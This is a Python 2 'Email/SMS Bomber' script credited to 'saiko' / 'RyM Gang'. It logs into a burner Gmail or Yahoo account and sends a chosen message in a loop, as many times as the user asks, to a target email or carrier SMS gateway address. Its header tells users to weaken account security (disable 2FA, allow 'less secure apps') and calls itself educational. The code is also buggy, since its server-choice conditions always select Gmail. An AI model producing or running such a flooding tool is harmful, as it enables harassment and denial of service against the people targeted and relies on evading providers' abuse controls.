#!/usr/bin/python
#[+]========================================[+]
# |  Simple Email/SMS Bomber - saiko         |
# |  Make A Burner Gmail/Yahoo Account       |
# |  Disable 2FA And Allow 'Less Secure Apps'|
# |  This Is For Educational Purposes Only!  |
#[+]========================================[+]
import os
import smtplib
import getpass
import sys
import time

print("\n       [+] Email/SMS Bomber - RyM Gang [+]")
def bomber():
    if os.name == 'nt':
        os.system("cls")
    else:
        os.system("clear")

server = raw_input("\nWhich Mail Server Are We Using? - 1.Gmail/2.Yahoo: ")
source_email = raw_input("Source Email: ")
source_pass = raw_input("Source Emails Password: ")
print("\n[!] To Use For SMS, Target Must Be In Email Format. Eg. 5551234567@mms.att.net [!]")
target = raw_input("\nTarget: ")
#subject = raw_input('Subject: ')
subject = os.urandom(9)
body = raw_input("Message: ")
tosend = input("How Many Are We Sending?: ")

if server == 'gmail' or '1' or 'Gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo' or '2' or 'Yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print ("\n[-] Error - Enter 1 for Gmail/2 For Yahoo [-]")
    time.sleep(3)
    sys.exit()

print("[+] Attempting To Run...")
try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    if smtp_server == 'smtp.gmail.com':
            server.starttls()
    server.login(source_email,source_pass)
    for i in range(1, tosend+1):
        content = 'From: ' + source_email + '\nSubject: ' + subject + '\n' + body
        server.sendmail(source_email,target,content)
        print("\r[+] Sent: %i [+]" % i)
        sys.stdout.flush()
    server.quit()
    print("\n[+] Finished [+]")
except KeyboardInterrupt:
    print ("\n[-] Canceled [-]")
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print("\n[!] User Or Pass Incorrect. If You are using Gmail, Check That You Allowed Less Secure Apps [!]")
    sys.exit()
